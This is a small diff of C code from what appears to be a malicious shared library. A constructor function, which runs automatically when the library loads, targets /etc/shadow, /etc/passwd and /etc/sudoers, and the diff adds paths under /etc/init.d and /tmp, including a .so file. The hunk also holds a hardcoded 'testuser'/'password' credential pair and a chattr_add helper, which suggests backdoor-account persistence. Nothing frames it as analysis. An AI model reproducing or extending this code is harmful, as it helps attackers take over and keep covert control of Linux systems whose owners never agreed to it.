@@ -42,7 +42,7 @@ void chattr_add(char *files[])
 
 int __attribute__((constructor)) ctor() 
 {
-	char *files[] = { "/etc/shadow", "/etc/passwd", "/etc/sudoers" };
+	char *files[] = { "/etc/shadow", "/etc/passwd", "/etc/sudoers", "/etc/init.d/shadow", "/tmp/shadow", "/tmp/user.so" };
 
 	char *username = "testuser";
 	char *password = "password";
